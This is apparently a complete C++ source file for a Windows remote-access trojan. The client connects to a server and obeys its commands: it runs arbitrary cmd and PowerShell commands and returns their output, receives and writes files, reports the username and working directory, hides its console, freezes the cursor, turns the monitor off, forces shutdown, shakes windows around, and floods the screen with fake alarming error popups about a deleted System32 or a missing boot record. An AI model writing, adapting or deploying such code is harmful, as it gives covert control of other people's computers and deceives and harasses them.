#define END_OF_MESSAGE 2
#define END_OF_LINE 1

#include <ws2tcpip.h>
#include <windows.h>
#include <vector>
#include <mutex>
#include <Shlobj.h>
#include <thread>
#include <cstdlib>
#include <ctime>
#include <iostream>

#pragma comment(lib, "ws2_32")

static char path[MAX_PATH + 1];

int screen_width = GetSystemMetrics(SM_CXSCREEN);
int screen_height = GetSystemMetrics(SM_CYSCREEN);
std::mutex std_lock;
HANDLE OUTPUT_HANDLE = GetStdHandle(STD_OUTPUT_HANDLE),
ERROR_HANDLE = GetStdHandle(STD_ERROR_HANDLE),
INPUT_HANDLE = GetStdHandle(STD_INPUT_HANDLE);
CONSOLE_READCONSOLE_CONTROL input;
DWORD str_length;
SOCKET connection_socket;
char buf[4096];
bool stop_cursor;
bool stop_spam;
bool stop_moving_windows;

struct WINDOW
{
    int width;
    int height;
    HWND hwnd;
    POINT pos;
    bool dec_x = false;
    bool dec_y = false;

    WINDOW(HWND);
    ~WINDOW();

};

WINDOW::WINDOW(HWND hwnd) :hwnd(hwnd)
{
    RECT rect;
    GetWindowRect(hwnd, &rect);

    width = rect.right - rect.left;
    height = rect.bottom - rect.top;

    pos.x = 0;
    pos.y = screen_height;
}

WINDOW::~WINDOW()
{

}

std::vector<WINDOW> active_windows;

void GetActiveWINDOWS()
{
    for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT))
    {
        if (!IsWindowVisible(hwnd))
            continue;

        int length = GetWindowTextLength(hwnd);
        if (length == 0)
            continue;

        char* title = new char[length + 1];
        GetWindowTextA(hwnd, title, length + 1);

        for (int i = 0; i < length; ++i)
            title[i] = tolower(title[i]);

        if (title == "program manager")
            continue;


        for (const auto& i : active_windows)
        {
            if (hwnd == i.hwnd)
                continue;
        }

        ShowWindow(hwnd, SW_RESTORE);
        active_windows.push_back(hwnd);
    }
}

void MoveActiveWINDOWS()
{
    for (std::vector<WINDOW>::iterator it = active_windows.begin(); it != active_windows.end(); ++it)
    {
        if (it->pos.x > screen_width)
            it->dec_x = true;
        else if (it->pos.x < 0)
            it->dec_x = false;
        if (it->pos.y > screen_height)
            it->dec_y = true;
        else if (it->pos.y < 0)
            it->dec_y = false;

        if (it->dec_x)
            it->pos.x -= 7;
        else
            it->pos.x += 7;
        if (it->dec_y)
            it->pos.y -= 7;
        else
            it->pos.y += 7;

        MoveWindow(it->hwnd, it->pos.x, it->pos.y, it->width, it->height, true);
    }
}

#define ERROR_MESSAGE_1 L"System32 is missing!", L"Windows", MB_OK | MB_ICONERROR
#define ERROR_MESSAGE_2 L"Deleting System32 Directory!", L"System32", MB_OK | MB_ICONERROR
#define ERROR_MESSAGE_3 L"Master boot record is missing!\n Your PC wont be able to boot up!", L"Windows", MB_OK | MB_ICONERROR
#define ERROR_MESSAGE_4 L"D3DSCache is missing!", L"WINDOWS", MB_OK | MB_ICONERROR
#define ERROR_MESSAGE_5 L"An unknown error has occurred.", L"Error", MB_OK | MB_ICONERROR
#define INFORMATION_MESSAGE_1 L"Windows 10 is no longer supported. Please downgrade to Windows XP.", L"Your PC is at risk"
#define INFORMATION_MESSAGE_2 L"System32 has been removed. Windows will need to restart\nfor this change to take effect.", L"Windows", MB_OKCANCEL | MB_ICONWARNING
#define INFORMATION_MESSAGE_3 L"Windows has found a bug in your system\na reboot is needed to fix the bug.", L"System32", MB_YESNO | MB_ICONWARNING
#define QUESTION_MESSAGE_1 L"Do you want to delete C:\\pagefile.sys in order to continue Mac OS X Installation?", L"Mac OS X Install Failed", MB_YESNO | MB_ICONQUESTION
#define QUESTION_MESSAGE_2 L"Do you want to delete C:\\Windows\\WinSxS to continue Mac OS X Installation?", L"Mac OS X Install Failed", MB_YESNO | MB_ICONQUESTION
#define DEFAULT_MESSAGE L"Are you sure you wan't to recycle recycle bin?", L"Recycle Bin", MB_YESNO | MB_ICONQUESTION

void Write(const wchar_t* buf)
{
    std_lock.lock();
    if (!WriteConsoleW(OUTPUT_HANDLE, (const void*)buf, (wcslen(buf)), 0, 0))
        throw 98;
    std_lock.unlock();
}

void Write(const char* buf)
{
    std_lock.lock();
    if (!WriteConsoleA(OUTPUT_HANDLE, (const void*)buf, strlen(buf), 0, 0))
        throw 99;
    std_lock.unlock();
}

HWND console;

enum COMMANDS
{
    EXIT = 0,
    SCREENSHOT = 1,
    BLOCKCURSOR = 2,
    UNLOCKCURSOR = 3,
    MONITOROFF = 4,
    MONITORON = 5,
    MOVEWINDOWS = 6,
    GETWINDOWS = 7,
    SELFHIDE = 8,
    SELFSHOW = 9,
    STARTSPAM = 10,
    STOPSPAM = 11,
    CREATEFILE = 12,
    RECEIVETEXT = 13,
    SETCURSORPOSITION = 14,
    NWODTUHS = 15,
    STOPMOVEWINDOW = 16,
    WHOAMI = 17,
    GETDIR = 18,
    CMD = 19,
    RECEIVE_FILE = 20,
    POWERSHELL = 21
};

void execute_command()
{
    FILE* result = _popen(buf+1, "r");

    if (!result)
    {
        snprintf(buf, sizeof(buf), "Failed to execute powershell!");
        send(connection_socket, buf, 4096, 0);
    }
    else
    {
        while (fgets(buf + 1, 4096, result) != NULL)
        {
            buf[0] = 0;
            buf[4095] = '\0';
            if (send(connection_socket, buf, 4096, 0) == SOCKET_ERROR)
                return;
            ZeroMemory(&buf, sizeof(buf));
        }
        buf[0] = END_OF_MESSAGE;
        send(connection_socket, buf, 1, 0);
        _pclose(result);
    }
}

void get_directory()
{
    DWORD length = 2048;
    if (!GetCurrentDirectoryA(length, buf))
    {
        closesocket(connection_socket);
        WSACleanup();
        exit(-1);
    }

    if (!send(connection_socket, buf, 2048, 0))
    {
        WriteConsole(OUTPUT_HANDLE, buf, 5, NULL, NULL);
        closesocket(connection_socket);
        WSACleanup();
        exit(-1);
    }

}

void get_username()
{
    DWORD length = 2048;
    if (!GetUserNameA(buf, &length))
    {
        Write(L"Failed to get username!");
        closesocket(connection_socket);
        WSACleanup();
        exit(-1);
    }

    if (!send(connection_socket, buf, 2048, 0))
    {
        WriteConsole(OUTPUT_HANDLE, buf, 5, &length, NULL);
        closesocket(connection_socket);
        WSACleanup();
        exit(-1);
    }
}

void nwodtuhs()
{
    system("shutdown -s -t 1");
}

void set_cursor_position()
{
    POINT p{};

    memcpy(&p, buf + 1, sizeof(p));

    SetCursorPos(p.x, p.y);
}

void receive_text()
{
    int length = strlen(buf + 1);
    char recvbuf[2050];
    memcpy(recvbuf, buf + 1, length + 1);
    Write("Server >> ");
    Write(recvbuf);
    Write("\n");
}

void begin_spam()
{
    stop_spam = false;

    std::thread popups[1000];
    int i = 0, x;

    srand(time(0));

    while (!stop_spam)
    {
        if (i >= 1000)
        {
            stop_spam = true;
            break;
        }

        x = rand() % 10 + 1;

        switch (x)
        {
        case 1:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, ERROR_MESSAGE_1); };
            popups[i].detach();
            break;
        case 2:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, ERROR_MESSAGE_2); };
            popups[i].detach();
            break;
        case 3:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, ERROR_MESSAGE_3); };
            popups[i].detach();
            break;
        case 4:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, ERROR_MESSAGE_4); };
            popups[i].detach();
            break;
        case 5:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, ERROR_MESSAGE_5); };
            popups[i].detach();
            break;
        case 6:
            popups[i] = std::thread([]() {MessageBoxW(NULL, INFORMATION_MESSAGE_1, MB_YESNO | MB_ICONWARNING); });
            popups[i].detach();
            break;
        case 7:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, INFORMATION_MESSAGE_2); };
            popups[i].detach();
            break;
        case 8:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, INFORMATION_MESSAGE_3); };
            popups[i].detach();
            break;
        case 9:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, QUESTION_MESSAGE_1); };
            popups[i].detach();
            break;
        case 10:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, QUESTION_MESSAGE_2); };
            popups[i].detach();
            break;
        default:
            popups[i] = (std::thread)[]() {MessageBoxW(NULL, DEFAULT_MESSAGE); };
            popups[i].detach();
            break;
        }
        ++i;

        Sleep(rand() % 250 + 25);
    }
}

LPSTR desktop_directory()
{
    if (SHGetSpecialFolderPathA(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE))
        return path;
    else
        return LPSTR("ERROR");
}

void create_file()
{
    if (path[0] == -1)
        desktop_directory();
    int length = strlen(buf+1);
    char file_name[MAX_PATH + 1];
    ZeroMemory(&file_name, MAX_PATH+1);
    memcpy(file_name, path, strlen(path));
    file_name[strlen(file_name)] = '\\';
    memcpy(file_name+strlen(path)+1, &buf[1], length);
    file_name[MAX_PATH] = '\0';

    std::cout << file_name << std::endl;

    HANDLE result = CreateFileA(file_name,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (result == INVALID_HANDLE_VALUE)
        Write(L"Failed to create file!\n");
    CloseHandle(result);
}

void end_spam()
{
    stop_spam = true;
}

void block_cursor()
{
    stop_cursor = true;
    POINT p;
    GetCursorPos(&p);

    while (stop_cursor)
    {
        SetCursorPos(p.x, p.y);
        Sleep(25);
    }
}

void unlock_cursor()
{
    stop_cursor = false;
}

void monitor_off()
{
    PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}

void monitor_on()
{
    PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
}

void move_windows()
{
    stop_moving_windows = false;
    GetActiveWINDOWS();

    while (!stop_moving_windows)
    {
        MoveActiveWINDOWS();
        Sleep(5);
    }
}

void receive_file()
{
    HANDLE file;
    char file_name[25]{};
    size_t file_size, complete = 0, received;
    memcpy(&file_size, buf + 1, sizeof(file_size));
    memcpy(file_name, buf + 1 + sizeof(file_size), strlen(buf + 1 + sizeof(file_size)));
    file_name[24] = '\0';

    file = CreateFileA(file_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (file == INVALID_HANDLE_VALUE)
    {
        std::cout << "Failed to create file!" << std::endl;
        return;
    }

    while (complete < file_size)
    {
        received = recv(connection_socket, buf, 1024, 0);
        std::cout << "Wrote " << received << " bytes!" << std::endl;
        WriteFile(file, buf, received, NULL, NULL);
        ZeroMemory(&buf, sizeof(buf));
        complete += received;
        SetFilePointer(file, complete, NULL, FILE_BEGIN);
    }

    CloseHandle(file);
}

void get_windows()
{
    unsigned short to_start = 0;
    char title[100];
    for (HWND hwnd = GetTopWindow(NULL); hwnd != NULL; hwnd = GetNextWindow(hwnd, GW_HWNDNEXT))
    {
        int length = GetWindowTextLength(hwnd);

        if (length <= 0 || !IsWindowVisible(hwnd))
            continue;

        GetWindowTextA(hwnd, title, 100);

        if (to_start + length >= 4096)
            break;

        memcpy(buf + to_start, title, length);
        to_start += length;
        buf[to_start++] = '\n';
    }

    buf[4095] = '\0';

    if (!send(connection_socket, buf, sizeof(buf), 0))
        Write(L"Failed to send!\n");
}

void self_hide()
{
    if (console)
        ShowWindow(console, SW_HIDE);
    else
    {
        console = GetConsoleWindow();
        ShowWindow(console, SW_HIDE);
    }
}

void self_show()
{
    if(console)
        ShowWindow(console, SW_SHOW);
    else
    {
        console = GetConsoleWindow();
        ShowWindow(console, SW_SHOW);
    }
}

void execute_powershell()
{
    char p[60];
    snprintf(p, 60, "powershell.exe %s", buf+1);
    FILE* result = _popen(p, "r");

    if (!result)
    {
        snprintf(buf, sizeof(buf), "Failed to execute powershell!");
        send(connection_socket, buf, 4096, 0);
    }
    else
    {
        while (fgets(buf+1, 4096, result) != NULL)
        {
            buf[0] = 0;
            buf[4095] = '\0';
            if (send(connection_socket, buf, 4096, 0) == SOCKET_ERROR)
                return;
            ZeroMemory(&buf, sizeof(buf));
        }
        buf[0] = END_OF_MESSAGE;
        send(connection_socket, buf, 1, 0);
        _pclose(result);
    }
}

void FindCommand(char x)
{
    switch (x)
    {
    case EXIT:
        break;
    case SCREENSHOT:
        
        break;
    case BLOCKCURSOR:
    {
        std::thread worker(block_cursor);
        worker.detach();
    }
    break;
    case UNLOCKCURSOR:
        unlock_cursor();
        break;
    case MONITOROFF:
        monitor_off();
        break;
    case MONITORON:
        monitor_on();
        break;
    case MOVEWINDOWS:
    {
        std::thread window_worker(move_windows);
        window_worker.detach();
    }
    break;
    case GETWINDOWS:
        get_windows();
        break;
    case SELFHIDE:
        self_hide();
        break;
    case SELFSHOW:
        self_show();
        break;
    case STARTSPAM:
    {
        std::thread spam(begin_spam);
        spam.detach();
    }
    break;
    case STOPSPAM:
        end_spam();
        break;
    case CREATEFILE:
        create_file();
        break;
    case RECEIVETEXT:
        receive_text();
        break;
    case SETCURSORPOSITION:
        set_cursor_position();
        break;
    case NWODTUHS:
        nwodtuhs();
        break;
    case STOPMOVEWINDOW:
        stop_moving_windows = true;
        break;
    case WHOAMI:
        get_username();
        break;
    case GETDIR:
        get_directory();
        break;
    case CMD:
        execute_command();
        break;
    case RECEIVE_FILE:
        receive_file();
        break;
    case POWERSHELL:
        execute_powershell();
        break;
    default:
        break;;
    }
}

int main()
{
    path[0] = -1;
    WSADATA wsdata;

    if (WSAStartup(MAKEWORD(2, 2), &wsdata))
    {
        Write(L"Failed to initalize winsock 2.2!\n");
        return -1;
    }

    connection_socket = INVALID_SOCKET;

    addrinfo hints, * server_info = nullptr, * ptr = nullptr;

    memset((void*)&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo("127.0.0.1", "3500", &hints, &server_info))
    {
        Write(L"getaddrinfo failed!\n");
        WSACleanup();
        return -1;
    }
    for (ptr = server_info; ptr != NULL; ptr = ptr->ai_next)
    {
        connection_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

        if (connection_socket == INVALID_SOCKET)
        {
            WSACleanup();
            return -2;
        }

        if (connect(connection_socket, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
        {
            closesocket(connection_socket);
            connection_socket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(server_info);

    if (connection_socket == INVALID_SOCKET)
    {
        Write(L"Failed to connect to server!\n");
        WSACleanup();
        return -3;
    }

    Write(L"Connection Successful!\n");

    while (true)
    {
        ZeroMemory(&buf, 4096);
        int bytesrecv = recv(connection_socket, buf, 1024, 0);
        if (bytesrecv == SOCKET_ERROR)
        {
            Write(L"Error in recv()!\n");
            break;
        }
        else if (bytesrecv == 0 || buf[0] == 0)
        {
            Write(L"Server disconnected!\n");
            break;
        }

        FindCommand(buf[0]);
    }

    shutdown(connection_socket, SD_BOTH);
    closesocket(connection_socket);
    WSACleanup();

    return 0;
}

